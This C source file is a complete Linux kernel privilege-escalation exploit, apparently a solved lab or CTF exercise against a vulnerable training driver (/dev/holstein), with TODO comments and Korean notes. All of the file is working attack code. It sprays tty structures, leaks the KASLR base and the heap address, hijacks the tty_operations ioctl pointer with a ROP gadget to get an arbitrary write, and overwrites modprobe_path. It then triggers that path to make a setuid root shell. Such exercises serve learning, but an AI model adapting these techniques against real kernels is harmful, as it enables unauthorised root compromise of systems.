#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>



#define IS_ERROR(c, s)                                                         \
    {                                                                          \
        if ((c)) {                                                             \
            perror((s));                                                       \
            exit(EXIT_FAILURE);                                                \
        }                                                                      \
    }

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

int fd = 0;
#define NUM_TTYS 60

int ttys[NUM_TTYS];

void spray_tty_structs() {

    for (int j = 1; j < 20; j++)
         open("/dev/ptmx", O_RDWR | O_NOCTTY);
    
    fd = open("/dev/holstein", O_RDWR);

    for (int i = 0; i < 40; i++) {
        ttys[i] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    }
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

#define PTM_UNIX98_OPS_OFFSET 0xc38880

#define MODPROBE_PATH (kaslr_base + 0xe38180)
#define MOV_PRDX_ECX_RET (kaslr_base + 0x4b27c2)

unsigned long kaslr_base;

void arbitrary_write(unsigned long addr, unsigned int value) {


    // ropr vmlinux --noisy -R "mov \[rdx\]"
    // ropr vmlinux --noisy -R "mov \[rdx\], ecx; ret"
    // 0xffffffff814b27c2: mov [rdx], ecx; ret;
    /*
        mmov [rdx], ecx 가젯으로 4바이트 write 가능
        ioctl(fd, 0x55667788, 0xDEADBEEFCAFEBABE) - rcx = 0x55667788, rdx = 0xDEADBEEFCAFEBABE
    */

    for (int i = 0; i < NUM_TTYS; i++) {
        ioctl(ttys[i], value, addr);
    }

}

void spawn_modprobe_shell() {
    system("cp ./shell /tmp/shell");

    system("echo '#!/bin/sh' > /tmp/m");
    system("echo 'chown root:root /tmp/shell' >> /tmp/m");
    system("echo 'chmod u+s /tmp/shell' >> /tmp/m");
    system("chmod +x /tmp/m");

    system("echo -n '\xff\xff\xff\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    system("/tmp/dummy");

    system("/tmp/shell");
}

/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

int main() {
    unsigned long ops_addr = 0;
    char buf[0x500];


    // TODO #1 : Allocate g_buf around tty_structs.
    //           Implement spray_tty_structs() first, then use it.

    spray_tty_structs();
    
    read(fd, buf, 0x500);
    // TODO #2 : Leak KASLR base.
    //           You need to calculate PTM_UNIX98_OPS_OFFSET first.


    ops_addr = *(unsigned long*)&buf[0x418];
    kaslr_base = ops_addr - 0xc38880;
    printf("kaslr_base : 0x%lx\n", kaslr_base);

    // TODO #3 : Leak g_buf address, which is in the physmap region.
    
    unsigned long physmap_addr;
    physmap_addr = *(unsigned long*)&buf[0x438] - 0x438;
    printf("physmap_addr : 0x%lx\n", physmap_addr);


    // TODO #3 : Overwrite function table of the target object.
    //           Leverage ioctl() function pointer to invoke MOV_PRDX_ECX_RET.
    /* ??? */



    *(unsigned long*)&buf[0x418] = (unsigned long)physmap_addr; //fake_tty_operations
    *(unsigned long*)&buf[0xC * 8] = MOV_PRDX_ECX_RET; // 12 * 8

    write(fd, buf, 0x500);



    // TODO #4 : Overwrite the modprobe_path using arbitrary_write().
    //           You need to calculate MODPROBE_PATH address first.
    
    char modprobe_path[0x10] = "/tmp/m";

    for (int i = 0; i < 4; i++)
    {
        printf("modprobe_path[i] : %p\n", MODPROBE_PATH + (i * 4));
        arbitrary_write(MODPROBE_PATH + (i * 4), *(unsigned int*)&modprobe_path[i * 4]);
    }


    spawn_modprobe_shell();

    return 0;
}
